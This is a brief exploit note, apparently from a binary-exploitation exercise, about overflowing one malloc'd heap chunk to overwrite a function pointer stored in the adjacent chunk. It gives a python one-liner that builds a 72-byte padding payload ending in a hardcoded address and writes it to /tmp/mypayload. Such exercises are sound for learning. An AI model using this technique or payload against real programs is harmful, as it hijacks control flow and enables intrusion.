There is two coadjacent malloced chunks.

We overflow the malloced chunck with our target to overwrite the previous data inside the next chunk.
This previous data should have been called as a function soon after the copy.

python -c 'print "A"*72 + "\x54\x84\x04\x08"' | tr -d "\n" > /tmp/mypayload
(machine-dependent)

